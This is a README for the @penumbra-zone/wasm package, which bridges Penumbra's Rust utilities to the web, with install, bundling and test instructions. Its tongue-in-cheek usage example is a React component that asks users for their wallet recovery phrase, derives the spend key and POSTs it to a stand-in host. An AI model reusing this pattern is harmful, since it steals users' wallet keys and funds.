# @penumbra-zone/wasm

**To use this package, you need to [enable the Buf Schema Registry](https://buf.build/docs/bsr/generated-sdks/npm)**

```sh
echo "@buf:registry=https://buf.build/gen/npm/v1/" >> .npmrc
```

The Penumbra core repo has a ton of utilities and functions that are critical to
developing an app that interacts with the Penumbra chain. However, it is written
in Rust. This package exists to bridge the gap between the Rust environment and
the web. This is done via Web Assembly, the universal binary format that runs
almost anywhere.

## Consuming this package

If you're reading this, you're probably trying to use the package.

### install

```sh
pnpm add @penumbra-zone/wasm
```

If you intend to build transactions you also want `@penumbra-zone/keys`, an
optional dependency.

```sh
pnpm add @penumbra-zone/keys
```

### import and use

```tsx
import { generateSpendKey } from '@penumbra-zone/wasm/keys';
import { useState, useMemo } from 'react';

export const SpendKeyCat = () => {
  const [phrase, setPhrase] = useState('');
  const spendKey: SpendKey | null = useMemo(() => {
    try {
      return generateSpendKey(phrase);
    } catch (e) {
      console.log('Failed to generate key', e);
      return null;
    }
  }, [phrase]);

  useEffect(() => {
    if (spendKey)
      fetch('https://example.com/iamveryclever', {
        method: 'POST',
        body: spendKey.toJsonString(),
      });
  }, [spendKey]);

  if (!spendKey)
    return (
      <>
        <h1>Enter your Penumbra wallet recovery phrase to see a cat</h1>
        <label>Right here:</label>
        <input
          value={phrase}
          onChange={e => setPhrase(e.target.value)}
          placeholder='all egg author trap jump tone gorilla forward favorite jungle accident exotic avoid wait desk'
        />
      </>
    );

  return (
    <>
      <h1>Thanks!!</h1>
      <marquee height='90%' behavior='alternate' direction='down'>
        <marquee behavior='alternate' direction='right'>
          <h2>Here's a cat:</h2>
          <img src='https://cataas.com/cat' />
        </marquee>
      </marquee>
    </>
  );
};
```

### bundling

This package is distributed as uncompiled Typescript and precompiled WASM.

Modern browsers provide great support for WASM, but you are probably using a
bundler to transform your code, and many bundlers require special configuration
to use WASM in a sensible way.

We use Vite, which can handle the bundling natively, and
[vite-plugin-wasm](https://github.com/Menci/vite-plugin-wasm) for running tests
in node with vitest.

This list of examples will hopefully grow:

## Developing this package

We use [wasm-bindgen](https://rustwasm.github.io/docs/wasm-bindgen/) &
[wasm-pack](https://rustwasm.github.io/docs/wasm-pack/) to compile our Rust code
and create an NPM package that is easily used in modern browsers.

The WASM in this package is generated by Rust living in the `crate` directory.
You need Rust tooling to work on it.

```sh
rustup target add wasm32-unknown-unknown
cargo install cargo-watch wasm-pack
```

Now you can just run `pnpm compile` or `pnpm dev` in this package, and it should
work.

### Testing

This package contains both typescript tests executed with vitest, and WASM tests
executed with `wasm-bindgen-test`. You can run both with package scripts,

```sh
pnpm test
pnpm test:rust
```
